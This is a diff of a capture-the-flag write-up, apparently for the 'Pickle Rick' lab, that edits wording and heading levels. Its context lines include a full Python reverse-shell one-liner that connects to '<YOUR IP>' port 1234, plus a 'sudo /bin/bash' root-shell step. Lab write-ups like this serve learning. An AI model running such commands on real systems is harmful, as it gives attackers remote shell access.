@@ -146,7 +146,7 @@ and run
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-> Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3
+> Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3.
 > Replace your IP address with \<YOUR IP\>
 
 And we got the shell! 💪
@@ -159,11 +159,11 @@ Now let's find other ingredients.
 
 ![](/assets/images/picklerick/picklerickshell2.png)
 
-let's check the rick folder.
+let's check the /rick folder.
 
 ![](/assets/images/picklerick/picklerickshell3.png)
 
-It seems like we got 2nd ingredient!.
+Huh! the second ingredient. cool.
 
 ![](/assets/images/picklerick/picklerickshell4.png)
 
@@ -171,7 +171,7 @@ The 2nd Ingredient is **1 jerry tear**.
 
 > I checked for 3rd ingredient but unfortunately i can't able to find it. It seems like it is hidden inside /root folder. We need the root access to get the 3rd ingredient.
 
-## Privilege Escalation
+# Privilege Escalation
 
 Let's check if we have any root access. 
 
@@ -224,7 +224,7 @@ And we are Done!. Hurray!
 * sudo /bin/bash to obtain a root shell.
 * The /root folder contained the 3rd ingredient.
 
-## Before you leave
+# Before you leave
 
 If you have any constructive criticism or any questions, please drop an email at root@n0nu11.tech or ping me in [instagram](https://instagram.com/dvlp.er). I'll be happy to hear your feedback.
 
